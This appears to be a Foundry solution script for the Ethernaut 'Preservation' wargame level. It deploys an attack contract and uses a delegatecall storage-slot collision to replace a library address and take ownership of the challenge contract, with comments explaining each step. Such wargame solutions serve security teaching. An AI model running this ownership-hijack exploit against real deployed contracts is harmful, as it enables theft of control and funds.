// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Preservation} from "../src/Preservation.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Preservation.s.sol --tc PreservationSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

contract PreservationSolution is Script {
    
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    address myAddress = vm.envAddress("MY_ADDRESS");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("PRESERVATION_INSTANCE"));

    // attack idea: the timezonelibrary contract has a storage variable storedTime in slot 0
    // when we use delegatecall to call the setTime function we are changing the slot 0 of the Preservation contract
    // which is the address of the timeZone1Library contract => we can change the timeZone1Library address to our own contract
    // and then call the setTime function to change the owner variable, by having 3 variables in the attack contract
    // modifying the third to successfully change the owner variable

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        console.log("Owner of the Preservation contract before attack: ", Preservation(instance).owner());
        // deploy our attack contract
        PreservationAttack attack = new PreservationAttack();
        // call the setFirstTime function to change the timeZone1Library address to our own attack contract
        (bool success, ) = instance.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(uint160(address(attack)))));
        require(success, "The call to setFirstTime should be successful");
        console.log("Address of the timeZone1Library contract: ", Preservation(instance).timeZone1Library());
        // call setFirstTime again to change the storedTime variable in our contract
        (success, ) = instance.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(uint160(myAddress))));
        require(success, "The call to setFirstTime should be successful");

        console.log("Owner of the Preservation contract after attack: ", Preservation(instance).owner());
        require(Preservation(instance).owner() == myAddress, "The owner of the Preservation contract should be the address of the attack contract");
        vm.stopBroadcast();
    }


}

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    
    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    } 

}